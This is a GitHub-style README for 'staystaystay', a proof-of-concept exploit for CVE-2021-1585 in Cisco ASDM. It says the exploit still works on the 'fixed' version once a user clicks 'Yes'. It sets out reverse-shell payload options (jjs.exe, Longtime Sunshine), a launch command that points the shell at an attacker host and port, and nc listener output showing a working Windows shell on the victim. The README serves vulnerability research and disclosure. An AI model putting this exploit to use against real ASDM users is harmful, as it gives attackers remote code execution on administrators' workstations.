# staystaystay

`staystaystay` is a proof of concept exploit for [CVE-2021-1585](https://nvd.nist.gov/vuln/detail/CVE-2021-1585), a man in the middle or evil endpoint RCE issue affecting Cisco ASA Device Manager (ASDM). The issue was originally discovered by [Malcolm Lashley](https://gist.github.com/mlashley/7d2c16e91fe37c9ab3b2352615540025) and disclosed in the summer of 2021. However, at the time I was looking at this, it was unpatched in the latest version (ASDM 7.17(1)), I stumbled upon this independently.

Cisco "fixed" this in ASDM 7.18(1.152). I say "fixed" because this exploit still works just fine. The user will just need to click "Yes". See a video below.

Attackers can configure two types of payloads to obtain a reverse shell to the victim:

* jjs.exe based (a file touches disk - and this has recently been caught by Windows Defender)
* [Longtime Sunshine](https://github.com/jbaines-r7/longtime-sunshine) based

If a victim connects their ASDM to `staystaystay` then it will inject the configured payload resulting in a reverse shell. The `jjs` reverse shell can be caught with a typical `nc` listener (or even Metasploit, if you'd like). The Longtime Sunshine option requires the attacker use that framework.

As an example, the following command will start `staystaystay` on port 8443 with the `jjs` payload:

```
./staystaystay -j --lhost 10.0.0.2 --lport 1270 --https_port 8443
```

Once the victim connects to 8443, a reverse shell will be generated to 10.0.0.2:1270:

```
albinolobster@ubuntu:~$ nc -lvnp 1270
Listening on 0.0.0.0 1270
Connection received on 10.0.0.26 50283
Microsoft Windows [Version 10.0.19042.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Cisco Systems\ASDM>whoami
whoami
desktop-1hug9pt\albinolobster

C:\Program Files (x86)\Cisco Systems\ASDM>
```

The following video contains an example of exploition with Longtime Sunshine:

* https://www.youtube.com/watch?v=07VO2JGTWR8

The following video demonstrates the attack against a patched version:

* https://www.youtube.com/watch?v=ySgbHClk9HE

An AttackerKB write up can be found here:

* https://attackerkb.com/topics/0vIso8fLhQ/cve-2021-1585/rapid7-analysis

## Credit

* Taylor Swift - [Acoustic version](https://www.youtube.com/watch?v=JbiTT82XAo0&t=2423s)
